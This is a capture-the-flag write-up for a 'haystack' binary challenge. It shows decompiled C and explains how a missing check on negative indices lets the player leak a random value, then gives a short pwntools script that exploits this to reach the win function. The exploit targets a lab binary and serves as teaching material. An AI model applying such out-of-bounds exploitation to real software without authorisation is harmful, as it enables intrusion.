## Description:
Help! I've lost my favorite needle!

---

In the function below, it puts a tons of `0xb00` onto the stack.

```c
...
  for (i = 0; i < 0x100000; i = i + 1) {
    *(undefined4 *)(&stack0xffffffffffbfffe8 + (long)i * 4) = 0xb00;
  }
  vuln(&stack0xffffffffffbfffe8);
...
```

`vuln()` function:

```c
{
  int random_number;
  int num;
  long in_FS_OFFSET;
  int i;
  undefined8 buf;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  random_number = random_function();
  *(undefined4 *)(param_1 + (long)random_number * 4) = 0x1337;
  buf = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  i = 0;
  do {
    if (2 < i) {
LAB_00101429:
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    fwrite("Which haystack do you want to check?\n",1,0x25,stdout);
    fgets((char *)&buf,0x20,stdin);
    num = atoi((char *)&buf);
    if (num < 0x100001) {
      if (num == random_number) {
        printf("Hey you found a needle! And its number is 0x%08x! That\'s it!\n",
               (ulong)*(uint *)(param_1 + (long)num * 4));
        win();
      }
      else {
        printf("Hey, you found a needle, but it\'s number is 0x%08x. I don\'t like that one\n",
               (ulong)*(uint *)(param_1 + (long)num * 4));
        if (i == 0) {
          puts(
              "Shoot, I forgot to tell you that I hid a needle in every stack. But I only have one favorite needle"
              );
        }
        else {
          if (i == 1) {
            puts("Did I mention I\'m in a hurry? I need you to find it on your next guess");
          }
        }
      }
    }
    else {
      fwrite("I don\'t have that many haystacks!\n",1,0x22,stdout);
    }
    if (i == 2) {
      puts("I\'m out of time. Thanks for trying...");
      goto LAB_00101429;
    }
    puts("Let\'s try again!");
    i = i + 1;
  } while( true );
}
```

It generates a random number and asks for a number to check. Pretty much the same as the `Alien Math` challenge. But this time, the random number is totally random everytime we run the binary as there is a call to `srand(time(0))`.

```c
ulong random_function(void)
{
  long lVar1;
  int iVar2;
  time_t tVar3;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  tVar3 = time((time_t *)0x0);
  srand((uint)tVar3);
  iVar2 = rand();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (long)iVar2 % 0x100000 & 0xffffffff;
}
```

My initial thought was that I would have to get the right seed for that `rand()` function. But later on, I found out that in the `vuln()` function, it didn't check whether my input number was a negative one or not, which led to an out-of-bound read. With some calculation in gdb, I could see that by giving it `-22`, the random number would be outputed.

```python
from pwn import *

p = process('./haystack')

p.recv()
p.sendline(b'-22')

p.recvuntil(b'is ')

number = int(p.recvuntil(b'.')[:-1], 16)
print(hex(number))

p.recv()
p.sendline(str(number))

p.interactive()
```